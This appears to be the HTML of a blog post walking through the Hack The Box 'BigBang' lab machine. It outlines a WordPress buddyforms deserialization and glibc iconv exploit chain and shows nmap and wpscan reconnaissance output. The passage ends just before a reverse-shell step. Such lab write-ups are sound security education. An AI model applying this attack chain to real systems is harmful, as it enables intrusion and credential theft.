@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/04/30/hackthebox-bigbang/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewBigBang is a hard-difficulty machine from Hack The Box dealing initially with a buddyforms 2.7.7 WordPress plugin that is vulnerable to a chain of CVE-2024-2961 that is a Buffer Overflow in li">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: BigBang">
+<meta property="og:url" content="http://fouedsaidi.com/2025/04/30/Hackthebox-BigBang/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewBigBang is a hard-difficulty machine from Hack The Box dealing initially with a buddyforms 2.7.7 WordPress plugin that is vulnerable to a chain of CVE-2024-2961 that is a Buffer Overflow in li">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/BigBang.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/web.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/mysql.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/mysql1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/jadx.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/login.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/command.png">
+<meta property="article:published_time" content="2025-04-30T18:45:32.000Z">
+<meta property="article:modified_time" content="2025-05-01T09:16:48.072Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BigBang/BigBang.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: BigBang -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: BigBang</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-04-30 19:45:32</span>
+        <span class="mobile">2025-04-30 19:45:32</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-05-01 10:16:48</span>
+            <span class="mobile">2025-05-01 10:16:48</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>BigBang is a hard-difficulty machine from Hack The Box dealing initially with a buddyforms 2.7.7 WordPress plugin that is vulnerable to a chain of CVE-2024-2961 that is a Buffer Overflow in linux’s GLIBC library function iconv and CVE-2023–26326 that is a buddyForms unauthenticated insecure deserialization issue. This will grant us shell access to the system we’re we’ll be exfiltrating credentials first from WordPress config files and later from a grafana database file. We’ll finally abuse an API endpoint that’s vulnerable to command injection after thoroughly analysing an Android Application.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BigBang/BigBang.png"
+                      alt="BigBang-info-card"
+                ><figcaption>BigBang-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.10</span>.<span class="number">11.52</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span><span class="literal">-01-29</span> <span class="number">10</span>:<span class="number">34</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">50.39</span></span><br><span class="line">Host is up (<span class="number">0.17</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> d4:<span class="number">15</span>:<span class="number">77</span>:<span class="number">1</span>e:<span class="number">82</span>:<span class="number">2</span>b:<span class="number">2</span>f:f1:cc:<span class="number">96</span>:c6:<span class="number">28</span>:c1:<span class="number">86</span>:<span class="number">6</span>b:<span class="number">3</span>f (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">6</span>c:<span class="number">42</span>:<span class="number">60</span>:<span class="number">7</span>b:ba:ba:<span class="number">67</span>:<span class="number">24</span>:<span class="number">0</span>f:<span class="number">0</span>c:<span class="built_in">ac</span>:<span class="number">5</span>d:be:<span class="number">92</span>:<span class="number">0</span>c:<span class="number">66</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">62</span></span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">62</span> (Debian)</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://blog.bigbang.htb/</span><br><span class="line">Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">39.40</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we only have our typical ssh 22 port and an http 80 port redirecting us towards <a class="link"   target="_blank" rel="noopener" href="http://blog.bigbang.htb/" >http://blog.bigbang.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> so we’ll add an entry for that in our <code>/etc/hosts</code> file.</p>
+<h3 id="Web-Application-http-blog-bigbang-htb"><a href="#Web-Application-http-blog-bigbang-htb" class="headerlink" title="Web Application - http://blog.bigbang.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://blog.bigbang.htb/" >http://blog.bigbang.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>Nothing special about the web app at first glance:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BigBang/web.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>But looking at <a class="link"   target="_blank" rel="noopener" href="https://www.wappalyzer.com/" >Wappalyze <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> we can see it’s built on top of WordPress. So let’s scan for plugins we might get something interesting:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ wpscan --url http://blog.bigbang.htb                                      </span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.25</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://blog.bigbang.htb/ [10.10.11.52]</span></span><br><span class="line"><span class="string">[+] Started: Wed Apr 30 18:57:53 2025</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.62 (Debian)</span></span><br><span class="line"><span class="string"> |  - X-Powered-By: PHP/8.3.2</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress readme found: http://blog.bigbang.htb/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://blog.bigbang.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://blog.bigbang.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentytwentyfour</span></span><br><span class="line"><span class="string"> | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/</span></span><br><span class="line"><span class="string"> | Last Updated: 2024-11-13T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.3</span></span><br><span class="line"><span class="string"> | [!] Directory listing is enabled</span></span><br><span class="line"><span class="string"> | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty-Four</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwentyfour/</span></span><br><span class="line"><span class="string"> | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: &#x27;</span>Version: 1.1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Plugin(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] buddyforms</span></span><br><span class="line"><span class="string"> | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/</span></span><br><span class="line"><span class="string"> | Last Updated: 2025-02-27T23:01:00.000Z</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 2.8.17</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.7.7 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see we have a bunch of plugins, one interesting one is <code>buddyForms</code> version 2.7.7. Doing a quick research I could find this <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2024-2961" >CVE-2024-2961 vulnerability <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is a CNEXT PHP file-read to RCE. But that alone is not enough, we gotta combine it with this <a class="link"   target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" >Insecute Deserialization vulnerability CVE-2023-26326 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> in order for it to work.<br>And we could also find <a class="link"   target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits" >this nice PoC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for it.</p>
+<p>We can simply run this to get a reverse shell:</p>
